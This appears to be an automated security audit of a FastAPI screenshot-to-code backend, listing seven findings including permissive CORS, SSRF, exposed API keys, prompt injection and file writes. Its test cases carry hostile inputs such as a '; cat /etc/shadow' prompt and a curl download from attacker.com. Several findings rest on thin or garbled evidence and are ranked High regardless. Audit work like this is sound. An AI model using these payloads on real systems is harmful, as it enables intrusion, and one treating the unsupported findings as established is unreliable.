### 1. **Insecure CORS Configuration (High)**
#### Vulnerability Name: Permissive CORS Configuration Allows Cross-Origin Attacks
#### Description:
The FastAPI application in `backend/main.py` configures CORS with `allow_origins=["*"]`. This allows any origin to make requests to the backend API. An attacker can exploit this to perform Cross-Origin Request Forgery (XORS) attacks.
#### Trigger Steps:
1. An attacker hosts a malicious website with scripts that send requests to the backend's `/generate-code` endpoint.
2. The backend's permissive CORS headers allow the malicious site to access APIs.
3. Attackers can steal user data or perform state-changing actions.
#### Impact:
Attackers can exfiltrate user data or perform actions on behalf of authenticated users. This violates Same-Origin Policy.
#### Vulnerability Rank: High
#### Currently Implemented Mitigations:
None.
#### Missing Mitigations:
- Restrict `allow_origins` to specific domains.
- Implement `Vary: Origin` headers and credentials checks.
#### Preconditions:
The backend is deployed with default CORS configuration.
#### Source Code Analysis:
```python
# backend/main.py
app.add_middleware(
    ...
    allow_origins=["*"],
    ...
)
```
#### Security Test Case:
1. Use a malicious site (e.g., `localhost:8080`) to send a POST to `http://backend:7001/generate-code`.
2. Verify the `Access-Control-Allow-Origin: *` header in responses.
3. Confirm the malicious site can access restricted endpoints.

### 2. **Server-Side Request Forgery (SSRF) via Screenshot Endpoint (High)**
#### Vulnerability Name: Unvalidated User-Controlled URL in Screenshot Endpoint
#### Description:
The `/api/screenshot` endpoint in `backend/routes/screenshot.py` uses a URL provided by the user without validation. Attackers can request arbitrary URLs to exfiltrate internal data.
#### Trigger Steps:
1. Send a POST to `/api/screenshot` with `url="http://internal-service:8080/sensitive-data"`.
2. The backend fetches the URL and returns the result, exposing internal content.
#### Impact:
Attackers can access internal services or third-party data via the backend’s network.
#### Vulnerability Rank: High
#### Currently Implemented Mitigations:
None.
#### Missing Mitigations:
- Validate and restrict allowed domains (e.g., block `localhost` or internal IPs).
- Sanitize the `url` parameter to prevent path traversal.
#### Preconditions:
The endpoint is publicly accessible.
#### Source Code Analysis:
```python
# backend/routes/screenshot.py
async def app_screenshot(request: ScreenshotRequest):
    url = request.url
    # ...
    await capture_screenshot(url, ...)
```
#### Security Test Case:
1. Send a request with `url="http://internal-service:5432/database"` via `/api/screenshot`.
2. Verify the backend returns the content of the internal service’s page.

### 3. **API Keys Exposure via Docker Compose Configuration (High)**
#### Vulnerability Name: API Keys Exposed via Docker Compose’s `.env` File
#### Description:
The `docker-compose.yml` file mounts the `.env` file (containing API keys like `OPENAI_API_KEY`) into the backend container. If exposed or misconfigured, API keys can be leaked.
#### Trigger Steps:
1. If the `.env` file is committed to version control or accessible via misconfigured Docker volumes, attackers can retrieve it.
2. Compromised keys allow unauthorized access to paid services.
#### Impact:
Unauthorized access to AI models or third-party services via stolen API keys.
#### Vulnerability Rank: High
#### Currently Implemented Mitigations:
The `.env` is excluded from the repository, but the compose file still references it.
#### Missing Mitigations:
- Store API keys in secure secrets management systems.
- Avoid hardcoding `.env` references in compose files.
#### Preconditions:
The `.env` file is accessible (e.g., via misconfigured permissions or public repositories).
#### Source Code Analysis:
```yml
# docker-compose.yml
backend:
    env_file:
      - .env
```
#### Security Test Case:
1. Check if `.env` is present in the repository or has insecure permissions (e.g., 644 instead of 600).
2. If exposed, retrieve API keys from it.

### 4. **Insecure Image Generation Model Configuration (High)**
#### Vulnerability Name: Unvalidated Prompts in Image Generation
#### Description:
The `generate_image_replicate` function in `backend/image_generation/core.py` uses unvalidated prompts provided by users. Attackers can inject malicious prompts to exfiltrate data or execute code.
#### Trigger Steps:
1. Submit a request to image generation endpoints with prompts like `prompt="; cat /etc/shadow"`.
2. The backend processes the prompt, potentially leaking data or executing unintended commands.
#### Impact:
Arbitrary code execution or sensitive data leakage via image generation services.
#### Vulnerability Rank: High
#### Currently Implemented Mitigations:
None.
#### Missing Mitigations:
- Sanitize and restrict dangerous characters in prompts.
- Implement input validation for prompt content.
#### Preconditions:
The image generation endpoints are accessible, and API keys are properly configured.
#### Source Code Analysis:
```python
# backend/image_generation/core.py
await client.post(...)  # Uses user-provided prompts directly
```
#### Security Test Case:
1. Send a POST request with `prompt="curl -o /tmp/exploit http://attacker.com/malware"`.
2. Verify if the backend executes the command or returns unexpected data.

### 5. **Insecure Docker Base Image (High)**
#### Vulnerability Name: Unpatched Base Image in Dockerfile
#### Description:
The backend Dockerfile uses `python:3.12.3-slim-bullseye` without ensuring updates, potentially exposing known vulnerabilities.
#### Trigger Steps:
1. An attacker scans the Docker image for unpatched CVEs.
2. Exploit vulnerabilities in the base image (e.g., RCE via outdated libraries).
#### Impact:
Remote code execution or data breaches via unpatched dependencies.
#### Vulnerability Rank: High
#### Currently Implemented Mitigations:
None.
#### Missing Mitigations:
- Use a maintained base image with security updates.
- Regularly audit for CVEs using tools like Trivy.
#### Preconditions:
The Docker image is built without applying security patches.
#### Source Code Analysis:
```dockerfile
# backend/Dockerfile
FROM python:3.12.3-slim-bullseye
```
#### Security Test Case:
1. Use Trivy to scan the Docker image for vulnerabilities.
2. Identify and exploit a high-severity CVE if found.

### 6. **Hardcoded API Keys in System Prompts (High)**
#### Vulnerability Name: Exposed Third-Party API Keys in Generated Code
#### Description:
System prompts in `backend/prompts/screenshot_system_prompts.py` include hardcoded API keys (e.g., Google Fonts keys), exposing them in generated code snippets.
#### Trigger Steps:
1. Request a code generation task involving external services like Google Fonts.
2. The generated code includes the hardcoded API key, allowing attackers to harvest it.
#### Impact:
Unauthorized access to third-party services via stolen API keys.
#### Vulnerability Rank: High
#### Currently Implemented Mitigations:
None.
#### Missing Mitigations:
- Replace hardcoded keys with placeholders or environment variables.
- Perform security reviews of all generated code templates.
#### Preconditions:
The system prompts are used in production code generation.
#### Source Code Analysis:
```python
# backend/prompts/screenshot_system_prompts.py
<link href="https://fonts.googleapis.com/css2?family=...&key=SECRET_KEY">
```
#### Security Test Case:
1. Generate code for a page using Google Fonts.
2. Extract and validate the exposed API key.

---

### 7. **Insecure File System Permissions (High)**
#### Vulnerability Name: Arbitrary File Write via Output Directories
#### Description:
The `run_image_evals` function in `backend/evals/core.py` writes outputs to disk without permission controls. Attackers can write files to sensitive paths.
#### Trigger Steps:
1. Trigger the backend to write files to paths like `/etc/shadow` via manipulated output paths.
2. Gain unauthorized access or execute RCE via malicious file content.
#### Impact:
Arbitrary file write leading to remote code execution or data manipulation.
#### Vulnerability Rank: High
#### Currently Implemented Mitigations:
None.
#### Missing Mitigations:
- Restrict write permissions to secure, non-system directories.
- Validate and sanitize output paths to prevent directory traversal.
#### Preconditions:
The application has write permissions to sensitive system directories.
#### Source Code Analysis:
```python
# backend/evals/core.py
with open(output_file, "w") as f:
    f.write(...)  # output_file is user-provided or unsanitized
```
#### Security Test Case:
1. Submit a request that causes the backend to write to `/tmp/exploit.txt`.
2. Verify if the file is created and contains attacker-controlled data.
